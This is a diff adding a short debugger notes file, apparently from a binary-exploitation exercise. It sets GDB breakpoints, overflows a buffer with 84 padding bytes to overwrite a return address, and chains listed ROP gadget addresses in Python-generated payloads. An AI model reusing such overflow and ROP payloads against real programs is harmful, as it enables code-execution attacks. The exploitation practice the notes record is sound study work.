@@ -1,0 +1,19 @@
+
+
+break *copyData+23
+break *main+28
+
+
+run < <((python2 -c "print('A'*84+'B'*4)"))
+
+# rop gadget 1
+0x0804900a: ret
+0x080490ae: nop nop ret
+
+run < <((python2 -c "print('A'*84+'\x0a\x90\x04\x08' + '\xae\x90\x04\x08')" ))
+
+
+# replace gadget 1:
+0x080490af: nop ret
+0x080490ae: nop nop ret
+run < <(( python2 -c "print('A'*84+'\xaf\x90\x04\x08'+'\xae\x90\x04\x08')"))
